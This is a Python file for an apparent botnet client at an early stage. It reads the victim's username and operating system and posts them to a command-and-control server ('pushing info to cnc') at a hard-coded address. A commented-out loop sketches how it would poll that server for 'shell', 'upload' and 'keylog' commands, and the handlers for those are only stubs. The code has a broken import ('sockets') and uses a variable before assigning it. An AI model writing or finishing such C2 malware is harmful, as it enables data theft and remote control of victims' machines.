from datetime import datetime
import random
import sockets
import requests
import platform
import os

def curr_user():
        user = os.popen('whoami').read()
        user = user.split("\\", 1)[-1]
        return user
    
class Bot(object):
    

    def __init__(self):
        self.platform = platform.system()
        self.uid = "2135"
        self.username = curr_user()
        self.hostname = "end again"

    def reverse_shell(self):
        print("end")

    def ping_server(self):
        print("pushing info to cnc")
        print("username : " + self.username)
        print("hostname : " + self.hostname)
        print("OS : " + self.platform)
        send = {
                    'platform': str(self.platform),
                    'hostname': self.hostname,
                    'username': self.username
                }
        print(send['platform'])
        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/status', json=send)
        return r.text

    def run(self):
        print(self.ping_server())
        
        """
        while True:
            try:
                job = self.ping_server()
                if job:
                    print(line)
                    line = job
                    split_cmd = job.split(" ")
                    if len(split_cmd) > 0:
                        cmd = split_cmd[0]
                        args = split_cmd[1:]
                        if cmd == 'shell':
                            self.reverse_shell()
                        if cmd == 'upload':
                            print("end")
                        if cmd == 'keylog':
                            print("end")
            except:
                print("get fuct")
            """
def main():
    bot = Bot()
    bot.run()
if __name__ == "__main__":
    main()
